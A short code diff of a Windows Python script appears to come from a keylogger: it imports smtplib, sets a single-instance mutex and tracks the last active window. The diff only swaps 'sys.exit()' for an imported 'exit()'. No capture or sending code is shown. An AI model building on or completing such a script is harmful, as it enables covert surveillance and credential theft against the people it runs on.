@@ -5,11 +5,12 @@ from threading import Thread
 from time import sleep
 import datetime
 import smtplib
+from sys import exit
 
 instance = win32event.CreateMutex(None, 1, 'NOSIGN')
 if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
     instance = None
-    sys.exit()
+    exit()
 
 data = ''
 lastwindow = ''
